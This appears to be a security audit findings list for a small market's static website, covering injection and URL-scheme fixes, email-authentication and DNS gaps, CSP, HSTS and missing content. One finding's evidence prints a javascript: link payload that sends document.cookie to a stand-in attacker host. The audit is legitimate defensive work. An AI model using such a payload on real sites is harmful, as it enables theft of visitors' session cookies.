findings.title: Shop data could break out of the structured-data script block and inject HTML
findings.category: OWASP A05:2025 Injection; ASVS V1; CWE-79
findings.evidence: Both application/ld+json blocks were serialised with JSON.stringify, which does not escape angle brackets. Setting a shop name to 'RoseCraft' in data/shops.json and rebuilding produced a literal in shop/m3.html, outside the script element. Proven, then reverted.
findings.attack: Anyone who can edit data/shops.json, which the README invites a non-developer to do, injects arbitrary HTML into every page that shop appears on. The site's Content-Security-Policy blocks the injected event handler from executing, so the realistic outcome is defacement or a convincing fake form rather than script execution.
findings.fix: Added jsonld(), which escapes <, > and & as unicode escapes. The JSON stays valid and cannot close its own tag. Both blocks now use it.
findings.verification: node --test tools/test.mjs, test 'a shop name cannot break out of the structured-data script block'

findings.title: Link and image fields were escaped but their URL scheme was never checked
findings.category: OWASP A05:2025 Injection; ASVS V1; CWE-79
findings.location: tools/build.mjs, contactLinks() and the image render sites, before fix
findings.evidence: esc() escapes quotes and angle brackets but not the scheme. Setting a shop's website to a javascript: URL rendered <a href="javascript:fetch("https://evil.example/?c="+document.cookie)" ...> in shop/m3.html. Proven, then reverted.
findings.attack: Whoever edits the shop data turns a shop's Website or Instagram link into a javascript: URL, or points an image at an off-site tracker. The CSP blocks javascript: execution in current browsers, so this is defence in depth rather than a live hole, but the off-site image would load unblocked in any browser without CSP support.
findings.fix: safeUrl(), safeEmail() and safeImage() now sanitise at the point the data is loaded, so every render site inherits the check. Links must be https, emails must look like emails, image paths must sit under uploads/. Rejected values are dropped and named in the build output.
findings.verification: node --test tools/test.mjs, six tests covering javascript:, data:, http:, traversal, off-site images and malformed emails

findings.title: No DMARC record, so the domain can be spoofed in email
findings.evidence: DNS-over-HTTPS query for _dmarc.woodstreetindoormarket.co.uk TXT returns NXDOMAIN. The hPanel DNS zone contains seven records and none is a DMARC record.
findings.attack: Anyone sends email that appears to come from @woodstreetindoormarket.co.uk. Receiving servers have no published policy to reject it, and nobody receives reports that it is happening. Most likely abuse is invoice fraud or phishing aimed at traders, using the market's name.
findings.fix: Proposed: publish a DMARC record, starting at p=none with reporting, moving to quarantine then reject once reports are clean.
findings.verification: Re-query _dmarc TXT after the record is added; confirm reports arrive

findings.title: DKIM is not enabled for the Microsoft 365 mail flow
findings.evidence: Both standard Microsoft 365 DKIM selectors return NXDOMAIN. The MX record points at Microsoft 365 and SPF includes spf.protection.outlook.com, so mail flows through Microsoft but is not DKIM signed.
findings.attack: Without DKIM, forwarded mail loses its SPF pass and can fail authentication, so genuine enquiry replies are more likely to land in spam. It also leaves DMARC with only one signal to rely on, weakening SEC-003's fix.
findings.fix: Proposed: enable DKIM signing in the Microsoft 365 admin centre and publish the two CNAME records it issues.
findings.verification: Query both selectors; send a test message and confirm DKIM=pass in the headers

findings.title: No CAA record, so any certificate authority may issue for the domain
findings.evidence: CAA query returns NOERROR with no answer, so no CAA record is published.
findings.attack: An attacker who obtains control of the domain's DNS or email, or who exploits a weakness at any public CA, can have a certificate issued for the domain from a CA the owner has never used. A CAA record narrows that to the CAs actually in use.
findings.fix: Proposed: publish a CAA record permitting letsencrypt.org, which is what Hostinger issues through.
findings.verification: Query CAA; confirm certificate renewal still succeeds at the next renewal

findings.title: The Walthams email address is machine-readable in the contact form's action URL
findings.evidence: The address appears in plain text in the page source of the live contact page.
findings.attack: Address-harvesting crawlers read it straight from the page and add it to spam and phishing lists. It is a published business address, so the exposure is nuisance rather than breach, but the form makes it trivially scrapeable.
findings.fix: Proposed: FormSubmit issues a random alias for an activated form. Swapping the alias into FORM_ACTION in tools/build.mjs removes the address from the page while delivery is unchanged. The alias is only visible in the activation email or the FormSubmit dashboard, which the auditor does not have.
findings.verification: Rebuild and confirm the address no longer appears in contact.html, then send a test enquiry

findings.title: No security.txt, so a finder has no published route to report a problem
findings.evidence: The path returned 404 on the live site.
findings.attack: Not an attack. A researcher who finds a problem has no obvious contact and may post publicly instead of reporting privately.
findings.fix: Added /.well-known/security.txt pointing at the Walthams address, and amended the .htaccess dotfile rule so /.well-known/ stays reachable while every other dotted path stays blocked.
findings.verification: Fetch /.well-known/security.txt after deploy; confirm /.env still returns 403 or 404

findings.title: Two saved Instagram pages remain in the public git history
findings.location: git history, commit 49d274a, uploads/(3) Instagram.html and uploads/(3) Instagram2.html
findings.evidence: Both were committed, then deleted, and remain retrievable from history in a public repository. Each is about 1.4 MB of Meta's own markup. Checked specifically for credentials: the strings csrftoken, sessionid and ds_user_id appear only inside Instagram's cookie configuration block, which lists cookie names and lifetimes. No cookie value, no document.cookie assignment and no email address is present.
findings.attack: None found. Assessed and downgraded rather than assumed: had a session value been present, this would have been a critical Instagram account takeover. It is not. What remains is repository bloat and third-party markup the market has no licence to redistribute.
findings.fix: Not fixed. Removing them means rewriting git history, which the ground rules put behind explicit owner approval and which would break every existing clone. The files are already deleted from the site and from the working tree.
findings.verification: Confirmed no credential material present; re-check if the repository is ever made private or history is rewritten for another reason

findings.title: HSTS is published without includeSubDomains or preload
findings.evidence: Header is max-age=31536000 only. The site itself is HTTPS-only and redirects HTTP in one hop.
findings.attack: A first-ever visit to a subdomain over plain HTTP is not forced to HTTPS. The site's own hostnames are unaffected.
findings.fix: Deliberately not added. ftp.woodstreetindoormarket.co.uk has an A record pointing at the same server and fails TLS verification; includeSubDomains would make that hostname unreachable in a browser. Revisit if the ftp record is removed.
findings.verification: If ftp is removed from DNS, add includeSubDomains and re-test

findings.title: The Content-Security-Policy allows unsafe-inline for styles
findings.evidence: style-src 'self' 'unsafe-inline'. script-src is 'self' with no inline allowance, verified by loading all 36 pages with the policy applied: zero violations.
findings.attack: Inline style injection could restyle a page. It cannot execute script, because script-src does not permit inline. Realistic impact is cosmetic.
findings.fix: Not changed. The pages use inline style attributes throughout by design; removing them would mean rewriting every template for a cosmetic-only risk. The valuable half of the policy, script-src without unsafe-inline, is in force and is now protected by a test and a CI check.
findings.verification: node tools/audit.mjs reports zero CSP violations across all pages

findings.title: An FTP hostname is published for the domain
findings.evidence: The record exists and resolves to the web server. HTTPS to that hostname fails certificate verification. Whether the FTP service is actually enabled on the hosting account cannot be determined from outside, and was not probed.
findings.attack: If FTP is enabled, credentials and file contents cross the network in cleartext and the account is exposed to credential stuffing. Deployment does not use it, so it is very likely unused.
findings.fix: Proposed: confirm in hPanel whether FTP is enabled, disable it if not needed, and remove the DNS record. That also clears the blocker on SEC-009.
findings.verification: Confirm FTP disabled in hPanel; confirm the record is gone

findings.title: Repository protections are not confirmed
findings.evidence: Not inspectable from the session. The repository is public and deploys on push, so write access to the branch is equivalent to write access to the live site.
findings.attack: Anyone with repository write access, or anyone who compromises such an account, publishes to the live site with no review step.
findings.fix: Proposed: branch protection on the deployment branch, secret scanning with push protection, and two-factor authentication on every account with write access. CI is now in place to give branch protection something to require.
findings.verification: Owner confirms each setting in the repository settings pages

findings.title: Twenty-two of twenty-four shops have no photograph
findings.evidence: 22 shop pages carry a marked 'Photo on its way' slot.
findings.attack: Not a defect in the build: the placeholder is deliberate, visible and honest, and the alternative of a stand-in image would be worse. Listed so nobody mistakes it for finished content.
findings.fix: Needs photographs from the client. README documents the process.
findings.verification: Count drops as photos are added

findings.title: Vintage Corner has no description or category
findings.evidence: Both fields are empty in the client spreadsheet, so the page says a fuller listing is coming.
findings.fix: Needs a sentence from the trader.

findings.title: Units M13 to M22 are absent from the source data
findings.evidence: Unit numbering jumps from M11/12 to M23/24. The client spreadsheet has no rows for them.
findings.attack: None, but if those units exist the map is incomplete and visitors may be misdirected.
findings.fix: Needs confirmation from the client whether the units exist.
findings.verification: Units added to data/shops.json, or confirmed not to exist

findings.title: The Journal has no articles and What's On has no events
findings.evidence: Both pages show an explicit empty state rather than invented content. Journal has already been removed from the header navigation; What's On remains because it carries the Walthams announcement.
findings.fix: Needs content, or leave the empty states, which are honest.
